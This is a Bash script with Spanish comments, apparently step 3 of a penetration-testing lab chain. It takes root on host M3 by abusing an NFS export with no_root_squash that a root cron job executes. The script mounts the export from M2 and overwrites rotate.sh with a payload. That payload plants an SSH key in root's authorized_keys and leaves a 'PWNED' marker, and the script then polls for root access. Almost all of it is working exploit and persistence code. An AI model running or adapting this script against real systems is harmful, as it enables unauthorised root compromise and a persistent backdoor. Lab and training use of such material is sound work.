#!/usr/bin/env bash
# ============================================================================
#  lab/chain/03-m2-to-m3.sh — salto 3: M2 (root) → M3 (root)
# ----------------------------------------------------------------------------
#  Vulnerabilidad: NFS exporta /srv/storage/backups a toda la LAN con
#  no_root_squash, y root de M3 ejecuta cada minuto /srv/storage/backups/
#  rotate.sh como cron. El root del cliente NFS (M2) sobrescribe ese script
#  y obtiene ejecución como root en M3.
#
#  No se usa ninguna contraseña ni archivo de credenciales.
#
#  Uso:
#    bash lab/chain/03-m2-to-m3.sh            # imprime
#    bash lab/chain/03-m2-to-m3.sh --run      # ejecuta
# ============================================================================

set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_REPO_DIR="${LAB_REPO_DIR:-$(cd "$HERE/../.." && pwd)}"
LAB_LOG="${LAB_LOG:-${TMPDIR:-/tmp}/lab-chain.log}"
export LAB_REPO_DIR LAB_LOG
. "$HERE/../common/lib.sh"
LAB_ROLE=chain

RUN=0
WORK="${LAB_WORK:-${HOME:-/tmp}/lab-work}"
KEY="$WORK/id_lab"
EXPORT="${EXPORT:-/srv/storage/backups}"
MNT="${MNT:-/mnt/bkp}"

while (($#)); do
  case "$1" in
    --run) RUN=1; shift ;;
    --key) KEY="${2:?}"; shift 2 ;;
    -h|--help) echo "Uso: $0 [--run] [--key RUTA]"; exit 0 ;;
    *) die "opción desconocida: $1" ;;
  esac
done

lab_banner
step "salto 3 · M2 (${M2}, root) → M3 (${M3}, root)"
cat <<EOF
Vulnerabilidad: NFS no_root_squash + cron root sobre el export.

  ssh -i $KEY root@$M2 'mkdir -p $MNT; mount -t nfs $M3:$EXPORT $MNT'
  ssh -i $KEY root@$M2 'cat > $MNT/rotate.sh && chmod 755 $MNT/rotate.sh'  # payload
  # el cron de M3 ejecuta $EXPORT/rotate.sh como root cada minuto
  ssh -i $KEY root@$M3 'id; cat /root/PWNED-M3.txt'
EOF

if (( RUN == 0 )); then
  step "modo impresión"
  printf '  Sin --run no se ejecuta nada. Para atacar: --run\n' >&2
  exit 0
fi

[[ -f "$KEY" ]] || die "falta $KEY (corre 02-m1-to-m2.sh --run)"
PUB="$(cat "$KEY.pub")"
SSH_OPTS=(-i "$KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8)

step "montando el export en M2"
ssh "${SSH_OPTS[@]}" "root@$M2" \
  "mkdir -p $MNT; mountpoint -q $MNT || mount -t nfs $M3:$EXPORT $MNT; findmnt -no SOURCE,OPTIONS $MNT" \
  || die "no se pudo montar $M3:$EXPORT en M2 (¿2049 abierto a M2?)"

step "sobrescribiendo rotate.sh desde M2 (root del cliente)"
ssh "${SSH_OPTS[@]}" "root@$M2" "cat > $MNT/rotate.sh && chmod 755 $MNT/rotate.sh" <<EOF
#!/bin/sh
# lab: ejecutado por el cron root de M3
mkdir -p /root/.ssh
grep -qF '$PUB' /root/.ssh/authorized_keys 2>/dev/null || printf '%s\n' '$PUB' >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh 2>/dev/null
chmod 600 /root/.ssh/authorized_keys 2>/dev/null
id > /root/PWNED-M3.txt
hostname >> /root/PWNED-M3.txt
date -u >> /root/PWNED-M3.txt
EOF
ok "payload escrito en $EXPORT/rotate.sh"

step "esperando al cron de M3 (hasta 120 s)"
for i in $(seq 1 24); do
  out="$(ssh "${SSH_OPTS[@]}" "root@$M3" 'id; cat /root/PWNED-M3.txt' 2>/dev/null || true)"
  if grep -q 'uid=0' <<<"$out"; then
    printf '%s\n' "$out"
    ok "root en M3 por NFS no_root_squash + cron"
    step "siguiente salto"
    printf '  bash %s/04-m3-to-m4.sh --run\n' "$HERE" >&2
    exit 0
  fi
  sleep 5
done
die "el cron no ejecutó el payload; revisar /etc/cron.d/lab-rotate y el montaje"
